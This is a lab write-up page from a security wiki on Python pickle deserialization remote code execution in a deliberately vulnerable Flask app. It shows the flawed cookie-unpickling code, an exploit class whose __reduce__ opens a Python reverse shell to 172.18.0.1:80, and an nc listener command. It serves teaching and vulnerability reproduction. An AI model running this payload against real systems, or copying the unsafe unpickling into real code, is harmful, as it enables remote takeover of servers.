@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Python/unpickle/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Python Unpickle Deserialization Remote Code Execution - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Python Unpickle Deserialization Remote Code Execution", url: "#_top", children: [
+              {title: "Environment Setup", url: "#environment-setup" },
+              {title: "Vulnerability Reproduction", url: "#vulnerability-reproduction" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="README.zh-cn/" class="btn btn-xs btn-link">
+        Python Unpickle 反序列化远程代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../PIL-CVE-2018-16509/README.zh-cn/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../PIL-CVE-2018-16509/README.zh-cn/" class="btn btn-xs btn-link">
+        Python PIL/Pillow 远程命令执行漏洞 (CVE-2018-16509)
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="python-unpickle-deserialization-remote-code-execution">Python Unpickle Deserialization Remote Code Execution<a class="headerlink" href="#python-unpickle-deserialization-remote-code-execution" title="Permanent link">&para;</a></h1>
+<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
+<p>Python's pickle module is a popular serialization/deserialization tool that converts Python objects into byte streams and vice versa. However, when untrusted data is deserialized using pickle, it can lead to arbitrary code execution.</p>
+<p>This vulnerability occurs when an application deserializes user-controlled data using the pickle module without proper validation. An attacker can craft a malicious serialized object that, when deserialized, executes arbitrary commands on the target system.</p>
+<p>References:</p>
+<ul>
+<li><a href="http://rickgray.me/2015/09/12/django-command-execution-analysis.html">http://rickgray.me/2015/09/12/django-command-execution-analysis.html</a></li>
+<li><a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></li>
+<li><a href="https://docs.python.org/3/library/pickle.html#pickle.loads">https://docs.python.org/3/library/pickle.html#pickle.loads</a></li>
+<li><a href="https://intoli.com/blog/dangerous-pickles/">https://intoli.com/blog/dangerous-pickles/</a></li>
+</ul>
+<h2 id="environment-setup">Environment Setup<a class="headerlink" href="#environment-setup" title="Permanent link">&para;</a></h2>
+<p>Execute the following command to start the vulnerable Flask application:</p>
+<div class="highlight"><pre><span></span><code>docker compose build
+docker compose up -d
+</code></pre></div>
+<p>After the server is started, you can access <code>http://your-ip:8000</code> in your browser. The page will display <code>Hello {username}!</code>, where username is retrieved from the 'user' cookie. The application performs base64 decoding and deserialization on this cookie to extract the "username" variable. If no valid cookie is found, it defaults to "Guest".</p>
+<p>The vulnerable code in app.py looks like this:</p>
+<div class="highlight"><pre><span></span><code><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">)</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">index</span><span class="p">():</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">user</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">))</span>
+        <span class="n">user</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">user</span><span class="p">)</span>
+        <span class="n">username</span> <span class="o">=</span> <span class="n">user</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="n">username</span> <span class="o">=</span> <span class="s2">&quot;Guest&quot;</span>
+
+    <span class="k">return</span> <span class="s2">&quot;Hello </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">username</span>
+</code></pre></div>
+<h2 id="vulnerability-reproduction">Vulnerability Reproduction<a class="headerlink" href="#vulnerability-reproduction" title="Permanent link">&para;</a></h2>
+<p>To exploit this vulnerability, we need to create a malicious pickle object that will execute arbitrary commands when deserialized. The exploit uses Python's <code>__reduce__</code> method to specify what function to call when the object is unpickled.</p>
+<p>The provided exploit script (exp.py) creates a malicious pickle object that establishes a reverse shell connection to the attacker's machine:</p>
+<div class="highlight"><pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="nc">exp</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="k">def</span><span class="w"> </span><span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.18.0.1&quot;,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;&quot;&quot;&quot;</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="n">s</span><span class="p">,))</span>
+</code></pre></div>
+<p>To execute the exploit, first set up a netcat listener on your machine to receive the reverse shell:</p>
+<div class="highlight"><pre><span></span><code>nc -lvp 80
+</code></pre></div>
+<p>Then run the exploit script to send the malicious cookie to the vulnerable application:</p>
+<div class="highlight"><pre><span></span><code>python3 exp.py
+</code></pre></div>
+<p>When the server deserializes the malicious pickle object, it will execute the command and establish a reverse shell connection to your machine:</p>
+<p><img alt="Reverse Shell Demonstration" src="1.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="README.zh-cn/" class="btn btn-xs btn-link">
+        Python Unpickle 反序列化远程代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../PIL-CVE-2018-16509/README.zh-cn/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../PIL-CVE-2018-16509/README.zh-cn/" class="btn btn-xs btn-link">
+        Python PIL/Pillow 远程命令执行漏洞 (CVE-2018-16509)
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
